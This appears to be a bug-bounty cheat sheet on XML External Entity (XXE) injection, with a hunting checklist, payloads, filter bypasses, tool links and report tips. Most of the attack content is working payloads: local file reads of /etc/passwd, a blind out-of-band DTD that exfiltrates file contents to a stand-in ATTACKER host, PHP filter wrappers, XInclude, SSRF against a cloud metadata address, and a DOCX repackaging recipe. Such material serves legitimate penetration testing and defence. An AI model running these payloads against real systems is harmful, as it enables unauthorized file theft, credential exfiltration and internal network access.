# XML External Entity (XXE) Injection

XXE arises when an XML parser processes attacker-controlled documents with external entity resolution enabled, letting the attacker reference local files or remote URLs during parsing. It matters because a single XML endpoint can yield arbitrary file read, SSRF from the server, credential exfiltration (blind, via out-of-band), or denial of service. Typical impact is high to critical, especially against SOAP APIs, SSO/SAML, and file-upload processors (DOCX/SVG/RSS).

For the entity-expansion DoS variant (Billion Laughs), see [Billion Laugh Attack](./Billion_Laugh_Attack.md).

## Hunting Checklist

1. Fuzz content types: switch `application/json` / `application/x-www-form-urlencoded` bodies to `application/xml` (or `text/xml`) and send a benign XML doc — a parse error in response is a green light.
2. File uploads that accept docx/xlsx/pptx/zip: these are ZIP archives of XML — unzip, inject XML into an inner `.xml` part, rezip, upload.
3. SVG allowed in picture upload: SVG *is* XML — inject entities directly into the uploaded file.
4. RSS/Atom feed features: add malicious XML to the feed you provide.
5. Fuzz for `/soap`, `/api/soap`, `?wsdl` — some applications still run SOAP APIs; SOAP *is* XML end to end.
6. SSO/SAML integrations: inject malicious XML in the SAML request/response.
7. Confirm with a harmless external reference (Collaborator) before attempting file reads: an HTTP interaction proves the parser resolves external entities.
8. If no reflection of parsed content, hunt blind XXE with parameter entities + out-of-band exfil (see Test Cases).
9. Check error messages for parser hints (Xerces, libxml2, .NET) to pick the right exfil syntax.
10. Test second-order: XML stored once (e.g., profile) and parsed by a later feature.

## Test Cases & Examples

### Content-type switch probe

```http
POST /api/resource HTTP/1.1
Host: example.com
Content-Type: application/xml

<?xml version="1.0"?>
<data>test</data>
```

### Basic external entity — local file read

```xml
<?xml version="1.0"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

Windows variant: `file:///c:/windows/win.ini`. Error-based variant (no output rendering — read the exception): reference a malformed path and let the parser echo file content in the error.

### Blind XXE via external DTD (out-of-band exfiltration)

Payload sent to the target:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd">
  %dtd;
]>
<foo>bar</foo>
```

`evil.dtd` hosted on the attacker box:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?x=%file;'>">
%eval;
%exfil;
```

### Blind XXE when file contents must be base64-encoded (binary/multiline)

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?x=%file;'>">
%eval;
%exfil;
```

### Local file read without outbound network — PHP wrappers

```xml
<?xml version="1.0"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
<data>&xxe;</data>
```

### XInclude (no DOCTYPE needed)

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### SSRF / port-check vector

```xml
<?xml version="1.0"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<data>&xxe;</data>
```

### Upload-container injection (DOCX/XLSX/SVG/RSS/SOAP/SAML)

```bash
# OOXML: the document is a zip of XML parts
cp original.docx evil.docx
unzip evil.docx -d extracted
# edit word/document.xml (or another part) to add the DOCTYPE + &xxe; entity
cd extracted && zip -r ../evil.docx . -x '*.DS_Store'
# upload evil.docx
```

SVG example:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg width="100" height="100"><text x="0" y="15">&xxe;</text></svg>
```

### Denial of service

Entity-expansion DoS (Billion Laughs) is covered with full payload in [Billion_Laugh_Attack.md](./Billion_Laugh_Attack.md).

## Bypass Techniques

- **`<!DOCTYPE` filtered** → use XInclude shown above.
- **Outbound HTTP blocked but files readable** → local DTD exploitation: reference an existing system DTD and redefine one of its unused parameter entities (e.g., on Linux `file:///etc/passwd` via `%startpara`-style Xerces patterns; the exact entity name varies with the installed DTD).
- **WAF on payload signatures** → change encoding: UTF-16/UTF-32 documents, or wrap values in `<![CDATA[...]]>`; entity/encoding obfuscation of `SYSTEM`/`PUBLIC`.
- **Filtered characters `<` / `>`** → some processors accept UTF-7-encoded XML bodies.
- **No response output** → blind parameter-entity exfil (OOB), or error-based: force parser errors that leak content in the message.
- **Multiline/binary breaks URL exfil** → base64-encode through `php://filter` first.

## Tools & Resources

- XXEinjector: https://github.com/ENDEAVOURcloud/XXEinjector
- Burp Suite Repeater + Collaborator (interactsh as OOB fallback)
- PayLoadssAllTheThings — XXE: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- PortSwigger XXE labs: https://portswigger.net/web-security/xxe
- Owasp XXE cheat sheet: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- Local DTD trick writeups: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-with-local-dtd-file

## Report Tips

- Show the minimal proof chain: content-type acceptance → Collaborator HTTP interaction → `file:///etc/passwd` (or equivalent) content in the response.
- State whether the parser is reachable unauthenticated and whether exfiltration was blind (OOB) — blind + readable secrets is critical even with zero output.
- For upload-based XXE (DOCX/SVG/SAML), name the processing service if identifiable (it often indicates a second vulnerable backend).

---
*Author: [whitechaitai](https://twitter.com/whitechaitai)*
